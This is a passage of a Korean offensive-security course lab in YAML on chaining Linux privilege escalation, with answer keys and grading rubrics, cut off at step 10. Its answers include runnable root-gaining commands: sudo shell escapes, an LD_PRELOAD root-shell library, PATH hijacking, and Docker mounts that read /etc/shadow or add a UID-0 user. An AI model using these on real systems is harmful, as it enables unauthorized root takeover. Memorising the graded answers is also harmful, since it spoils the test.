lab_id: attack-adv-nonai-week06
title: 권한 상승 체인
version: non-ai
course: attack-adv-nonai
week: 6
description: Linux 시스템에서 초기 접근 권한으로부터 root 권한까지 다단계 권한 상승을 수행한다. SUID 바이너리, 커널 취약점, sudo 오설정, cron 악용
  등 다양한 권한 상승 벡터를 체이닝한다.
difficulty: hard
duration_minutes: 120
objectives:
- Linux 권한 상승 벡터를 체계적으로 열거한다
- SUID, sudo, cron, capabilities 등을 통한 권한 상승을 수행한다
- 다단계 권한 상승 체인을 구성한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 현재 사용자의 권한 정보를 수집하라. id, whoami, groups, sudo -l 명령을 실행하여 초기 권한 수준을 확인하라.
  hint: id, groups, sudo -l 명령으로 현재 권한과 사용 가능한 sudo 규칙을 확인한다
  category: recon
  points: 5
  answer: id && whoami && groups && sudo -l 2>&1 | head -20
  answer_detail: 권한 상승의 첫 단계는 현재 권한 수준을 파악하는 것이다. id 명령은 UID/GID와 소속 그룹을, sudo -l은 비밀번호 없이 실행 가능한 명령을
    보여준다. docker, lxd, disk 그룹 소속은 그 자체로 root 획득이 가능한 경우가 많다.
  verify:
    type: output_contains
    expect: uid=
    field: stdout
    semantic:
      intent: 권한 정보 수집 — id + whoami + groups + sudo -l. 첫 단계 = 현재 권한 파악. docker/lxd/disk 그룹 자체로 root.
        UID/GID/sudo 규칙. MITRE T1033 System Owner/User Discovery + T1069.001 Local Groups.
      success_criteria:
      - id + whoami + groups + sudo -l 모두
      - uid= 키워드 출력
      - 그룹 + sudo 규칙
      acceptable_methods:
      - id/whoami/groups/sudo -l
      - LinPEAS 자동 열거
      - linux-exploit-suggester
      negative_signs:
      - 명령 1개만
      - sudo -l 누락
      - 그룹 분석 없음
  target_vm: attacker
- order: 2
  instruction: SUID 비트가 설정된 바이너리를 시스템 전체에서 검색하라. GTFOBins에서 활용 가능한 바이너리를 식별하라.
  hint: find / -perm -4000 -type f 명령으로 SUID 바이너리를 검색한다
  category: recon
  points: 10
  answer: find / -perm -4000 -type f 2>/dev/null | head -20
  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 소유자(보통 root) 권한으로 실행된다. find, vim, nmap, python, bash
    등에 SUID가 설정되어 있으면 GTFOBins(https://gtfobins.github.io)의 기법을 사용하여 root 셸을 획득할 수 있다. 비표준 SUID 바이너리는
    특히 위험하다.
  verify:
    type: output_contains
    expect: /usr/
    field: stdout
    semantic:
      intent: SUID 바이너리 검색 — find / -perm -4000 -type f 2>/dev/null. SUID = 소유자(root) 권한 실행. find/vim/nmap/python/bash
        등 GTFOBins 활용. 비표준 SUID 위험. MITRE T1548.001 SetUID and SetGID. CWE-250.
      success_criteria:
      - find -perm -4000 -type f
      - /usr/ 경로 출력
      - GTFOBins 맥락
      acceptable_methods:
      - find -perm -4000
      - find -perm /6000 (SGID 포함)
      - LinPEAS suid 섹션
      negative_signs:
      - find 옵션 잘못
      - GTFOBins 활용 없음
      - 결과 분석 없음
  target_vm: attacker
- order: 3
  instruction: 커널 버전을 확인하고, 알려진 커널 취약점을 검색하라. uname -a와 cat /proc/version 명령으로 정보를 수집하라.
  hint: 커널 버전으로 DirtyCow, DirtyPipe 등 알려진 LPE 취약점을 검색한다
  category: recon
  points: 10
  answer: 'uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel LPE vulnerabilities:''
    && echo ''CVE-2016-5195 DirtyCow: Linux < 4.8.3'' && echo ''CVE-2022-0847 DirtyPipe: Linux 5.8 - 5.16.11''
    && echo ''CVE-2021-4034 PwnKit: polkit pkexec (any version)'' && echo ''CVE-2023-0386 OverlayFS: Linux
    < 6.2'''
  answer_detail: 커널 취약점은 가장 강력한 권한 상승 벡터이다. 커널 버전을 확인한 후 exploit-db, searchsploit 등에서 매칭되는 LPE(Local Privilege
    Escalation) 취약점을 검색한다. DirtyCow(CVE-2016-5195), DirtyPipe(CVE-2022-0847), PwnKit(CVE-2021-4034)은 광범위한
    커널 버전에 영향을 미치는 대표적 취약점이다.
  verify:
    type: output_contains
    expect: Linux
    field: stdout
    semantic:
      intent: '커널 LPE 검색 — uname -a + cat /proc/version + 알려진 CVE: DirtyCow(CVE-2016-5195, <4.8.3) + DirtyPipe(CVE-2022-0847,
        5.8-5.16.11) + PwnKit(CVE-2021-4034, polkit) + OverlayFS(CVE-2023-0386, <6.2). exploit-db/searchsploit
        매핑.'
      success_criteria:
      - uname -a + 커널 버전
      - Linux 키워드 출력
      - CVE 매핑 (DirtyCow/Pipe/PwnKit) 3개 이상
      acceptable_methods:
      - uname + searchsploit
      - linux-exploit-suggester-2
      - LES (LSE)
      negative_signs:
      - 커널 버전 없음
      - CVE 매핑 없음
      - LPE 맥락 없음
  target_vm: attacker
- order: 4
  instruction: sudo 오설정을 통한 권한 상승을 분석하라. sudo에서 셸 이스케이프가 가능한 프로그램(vim, less, find 등)의 활용법을 정리하라.
  hint: GTFOBins의 sudo 섹션을 참고하여 셸 이스케이프 기법을 문서화한다
  category: exploit
  points: 10
  answer: echo '=== Sudo Shell Escape Techniques ===' && echo '' && echo '[vim] sudo vim -c ":!bash"'
    && echo '[less] sudo less /etc/hosts -> !bash' && echo '[find] sudo find / -name x -exec /bin/bash
    \;' && echo '[nmap] sudo nmap --interactive -> !sh' && echo '[python] sudo python3 -c "import os;os.system("/bin/bash")"'
    && echo '[awk] sudo awk "BEGIN {system("/bin/bash")}"' && echo '[env] sudo env /bin/bash' && echo
    '[man] sudo man man -> !bash' && echo '' && echo 'Current sudo permissions:' && sudo -l 2>&1 | tail
    -10
  answer_detail: sudo로 실행 가능한 프로그램 중 다수가 셸 이스케이프를 허용한다. vim은 :!bash, less는 !bash, find는 -exec, python은
    os.system() 등으로 root 셸을 획득할 수 있다. 이를 방지하려면 NOEXEC 태그를 사용하거나, 특정 명령의 인자까지 제한해야 한다.
  verify:
    type: output_contains
    expect: Sudo Shell Escape
    field: stdout
    semantic:
      intent: 'sudo 셸 이스케이프 — vim(:!bash) + less(!bash) + find(-exec /bin/bash) + nmap(--interactive !sh)
        + python(os.system) + awk(BEGIN{system}) + env(/bin/bash) + man(!bash). GTFOBins. 방어: NOEXEC +
        인자 제한. MITRE T1548.003 Sudo and Sudo Caching.'
      success_criteria:
      - Sudo Shell Escape 키워드
      - 프로그램 4개 이상 (vim/less/find/python 등)
      - 각 이스케이프 명령
      acceptable_methods:
      - GTFOBins sudo 섹션
      - 수동 셸 이스케이프
      - sudo -l + GTFOBins 매칭
      negative_signs:
      - 프로그램 2개 이하
      - 이스케이프 명령 없음
      - 방어 없음
  target_vm: attacker
- order: 5
  instruction: cron 작업에서 권한 상승 벡터를 찾아라. 시스템 crontab과 사용자 crontab을 검사하고, 월드 writable 스크립트를 참조하는 항목을 식별하라.
  hint: cat /etc/crontab, ls -la /etc/cron.d/, crontab -l 등으로 스케줄된 작업을 확인한다
  category: recon
  points: 10
  answer: echo '=== Cron Jobs ===' && cat /etc/crontab 2>/dev/null && echo '---' && ls -la /etc/cron.d/
    2>/dev/null && echo '---' && ls -la /etc/cron.daily/ 2>/dev/null | head -10 && echo '---' && echo
    'World-writable scripts referenced by cron:' && find /etc/cron* -type f -exec grep -l '/' {} \; 2>/dev/null
    | head -5
  answer_detail: cron 작업이 월드 writable 스크립트를 실행하면, 공격자가 스크립트를 수정하여 root 권한으로 코드를 실행할 수 있다. PATH 변수 조작(cron의
    PATH에 공격자 디렉토리를 추가)이나 와일드카드 인젝션(tar * → --checkpoint 옵션 삽입)도 가능하다.
  verify:
    type: output_contains
    expect: Cron
    field: stdout
    semantic:
      intent: 'cron 권한 상승 — cat /etc/crontab + ls /etc/cron.d/ + cron.daily + 월드 writable 스크립트 grep. 공격:
        스크립트 수정 / PATH 조작(공격자 디렉토리 추가) / 와일드카드 인젝션(tar * + --checkpoint). MITRE T1053.003 Scheduled Task:
        Cron.'
      success_criteria:
      - Cron 키워드
      - crontab + cron.d + cron.daily 3종
      - 월드 writable 검사
      acceptable_methods:
      - cat /etc/crontab + ls /etc/cron.*
      - pspy 모니터링
      - auditd cron 감시
      negative_signs:
      - cron 검사 1종만
      - writable 검사 없음
      - 공격 벡터 없음
  target_vm: attacker
- order: 6
  instruction: Linux capabilities를 통한 권한 상승을 검색하라. getcap으로 특수 capabilities가 설정된 바이너리를 찾아라.
  hint: getcap -r / 명령으로 시스템 전체의 capabilities를 검색한다
  category: recon
  points: 10
  answer: getcap -r / 2>/dev/null | head -20 && echo '---' && echo 'Dangerous capabilities:' && echo 'cap_setuid
    -> Change UID to root' && echo 'cap_dac_override -> Bypass file permission checks' && echo 'cap_sys_admin
    -> Mount filesystems, debug processes' && echo 'cap_net_raw -> Raw socket access (packet sniffing)'
  answer_detail: Linux Capabilities는 root 권한을 세분화한 것이다. cap_setuid+ep가 설정된 python은 os.setuid(0)으로 root가
    되고, cap_dac_override는 모든 파일을 읽을 수 있다. SUID보다 잘 알려지지 않아 관리자가 간과하는 경우가 많다.
  verify:
    type: output_contains
    expect: cap_
    field: stdout
    semantic:
      intent: Capabilities 검색 — getcap -r / 2>/dev/null. cap_setuid → setuid(0) root / cap_dac_override
        → 권한 우회 / cap_sys_admin → 마운트/디버그 / cap_net_raw → 패킷 스니핑. SUID보다 잘 알려지지 않음. MITRE T1548. CWE-732.
      success_criteria:
      - getcap -r 실행
      - cap_ 키워드 출력
      - 위험 caps 4개 이상 (setuid/dac/admin/net_raw)
      acceptable_methods:
      - getcap -r /
      - GTFOBins capabilities 섹션
      - filecap (libcap-ng)
      negative_signs:
      - getcap 없음
      - 위험 caps 분석 없음
      - 단순 listing
  target_vm: attacker
- order: 7
  instruction: 월드 writable 파일과 디렉토리를 검색하라. 특히 /etc 하위의 쓰기 가능한 설정 파일을 찾아라.
  hint: find / -writable -type f 명령으로 쓰기 가능한 파일을 검색한다
  category: recon
  points: 10
  answer: find /etc -writable -type f 2>/dev/null | head -10 && echo '---' && find / -writable -type d
    2>/dev/null | grep -v proc | grep -v sys | head -10 && echo '---' && echo 'Writable /etc/passwd ->
    add root user' && echo 'Writable /etc/shadow -> replace root hash' && echo 'Writable /etc/sudoers
    -> grant sudo access'
  answer_detail: 월드 writable 설정 파일은 치명적인 권한 상승 벡터이다. /etc/passwd에 쓸 수 있으면 UID 0인 새 사용자를 추가할 수 있고(openssl
    passwd로 해시 생성), /etc/sudoers에 쓸 수 있으면 자신에게 sudo ALL 권한을 부여할 수 있다. /etc/ld.so.conf에 쓰면 LD preload 공격이
    가능하다.
  verify:
    type: output_contains
    expect: writable
    field: stdout
    semantic:
      intent: 월드 writable 파일/디렉터리 — find /etc -writable -type f + find / -writable -type d. /etc/passwd
        writable → UID 0 추가 (openssl passwd) / /etc/sudoers → ALL 권한 / /etc/ld.so.conf → LD preload 공격.
        CWE-732. MITRE T1222.
      success_criteria:
      - find -writable -type f/d
      - writable 키워드 출력
      - 위험 파일 (/etc/passwd/sudoers) 언급
      acceptable_methods:
      - find -writable
      - find -perm -2
      - namei -l 권한 추적
      negative_signs:
      - 검색 없음
      - 위험 파일 맥락 없음
      - 권한 상승 활용 없음
  target_vm: attacker
- order: 8
  instruction: LD_PRELOAD를 활용한 권한 상승 기법을 시뮬레이션하라. 간단한 공유 라이브러리 소스를 작성하고, 컴파일 명령을 보여라.
  hint: init() 함수에서 setuid(0)과 system("/bin/bash")을 호출하는 .c 파일을 작성한다
  category: exploit
  points: 10
  answer: "cat > /tmp/preload.c << 'CEOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\
    \nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0, 0, 0);\n    system(\"/bin/bash -p\"\
    );\n}\nCEOF\ncat /tmp/preload.c && echo '' && echo '=== Compile & Exploit ===' && echo 'gcc -fPIC\
    \ -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c' && echo 'sudo LD_PRELOAD=/tmp/preload.so\
    \ <allowed_command>' && echo '' && echo 'Requires: sudo with env_keep+=LD_PRELOAD or NOPASSWD command'"
  answer_detail: LD_PRELOAD는 프로그램 실행 시 지정된 공유 라이브러리를 먼저 로드한다. sudo가 env_keep에 LD_PRELOAD를 허용하면, _init()
    함수에서 root 셸을 실행하는 라이브러리를 로드할 수 있다. 대부분의 현대 sudo는 이를 차단하지만, 특수 설정 환경에서는 여전히 유효하다.
  verify:
    type: output_contains
    expect: LD_PRELOAD
    field: stdout
    semantic:
      intent: 'LD_PRELOAD 공격 — preload.c: void _init() { unsetenv(LD_PRELOAD); setresuid(0,0,0); system(/bin/bash
        -p); } + gcc -fPIC -shared -nostartfiles + sudo LD_PRELOAD=preload.so cmd. sudo env_keep+=LD_PRELOAD
        시. MITRE T1574.006 Hijack Execution Flow.'
      success_criteria:
      - LD_PRELOAD 키워드
      - _init() + setresuid(0)
      - gcc -fPIC -shared 컴파일
      acceptable_methods:
      - LD_PRELOAD .so
      - LD_LIBRARY_PATH 변형
      - linker 후크
      negative_signs:
      - _init 없음
      - setresuid 없음
      - gcc 명령 없음
  target_vm: attacker
- order: 9
  instruction: PATH 하이재킹을 통한 권한 상승을 시뮬레이션하라. SUID 바이너리가 절대 경로 없이 명령을 호출하는 경우를 악용하는 기법을 보여라.
  hint: 공격자 디렉토리에 같은 이름의 악성 스크립트를 생성하고 PATH 앞에 추가한다
  category: exploit
  points: 10
  answer: 'echo ''=== PATH Hijacking ==='' && echo ''#!/bin/bash'' > /tmp/ps && echo ''id && whoami''
    >> /tmp/ps && chmod +x /tmp/ps && echo ''Created fake "ps" at /tmp/ps:'' && cat /tmp/ps && echo ''''
    && echo ''If SUID binary calls: system("ps") without full path'' && echo ''Exploit: export PATH=/tmp:$PATH
    && run_suid_binary'' && echo ''Result: /tmp/ps (attacker script) executed as root'' && rm /tmp/ps'
  answer_detail: PATH 하이재킹은 프로그램이 명령을 절대 경로 없이 호출할 때 발생한다. SUID 바이너리가 system("ps")를 호출하면, PATH에서 ps를 검색한다.
    공격자가 자신의 디렉토리를 PATH 앞에 추가하면, 악성 스크립트가 root 권한으로 실행된다. 안전한 코딩은 항상 절대 경로(/usr/bin/ps)를 사용해야 한다.
  verify:
    type: output_contains
    expect: PATH Hijacking
    field: stdout
    semantic:
      intent: 'PATH 하이재킹 — /tmp/ps에 #!/bin/bash + id + chmod +x → export PATH=/tmp:$PATH + SUID 바이너리 system("ps")
        호출. 절대 경로 미사용 SUID 악용. 안전한 코딩: 항상 /usr/bin/ps 절대 경로. MITRE T1574.007 Path Interception.'
      success_criteria:
      - PATH Hijacking 키워드
      - /tmp/명령 가짜 스크립트
      - PATH 변경 + SUID 호출
      acceptable_methods:
      - PATH 앞 추가
      - alias 함수 후킹
      - BPF 후킹
      negative_signs:
      - 가짜 명령 없음
      - PATH 변경 없음
      - SUID 호출 맥락 없음
  target_vm: attacker
- order: 10
  instruction: Docker 그룹을 통한 권한 상승 기법을 분석하라. docker 그룹 사용자가 root를 획득하는 명령을 작성하라.
  hint: docker run으로 호스트 파일시스템을 마운트하면 root 권한으로 접근 가능하다
  category: exploit
  points: 10
  answer: 'echo ''=== Docker Group Privilege Escalation ==='' && echo ''docker run -v /:/hostfs -it alpine
    chroot /hostfs /bin/bash'' && echo '''' && echo ''Alternative methods:'' && echo ''1. Mount /etc/shadow:
    docker run -v /etc/shadow:/shadow alpine cat /shadow'' && echo ''2. Add SUID bash: docker run -v /:/mnt
    alpine chmod u+s /mnt/bin/bash'' && echo ''3. Modify /etc/passwd: docker run -v /etc:/etc alpine sh
    -c "echo root2::0:0::/root:/bin/bash >> /etc/passwd"'' && echo '''' && groups 2>&1'
  answer_detail: docker 그룹 소속은 사실상 root와 동등하다. Docker 소켓(/var/run/docker.sock)에 접근할 수 있으면 호스트 파일시스템을 마운트하여
    모든 파일을 읽고 쓸 수 있다. lxd, disk, adm 그룹도 유사한 위험이 있다. 일반 사용자를 docker 그룹에 추가할 때는 이 위험을 인지해야 한다.
  verify:
    type: output_contains
    expect: Docker Group
    field: stdout
    semantic:
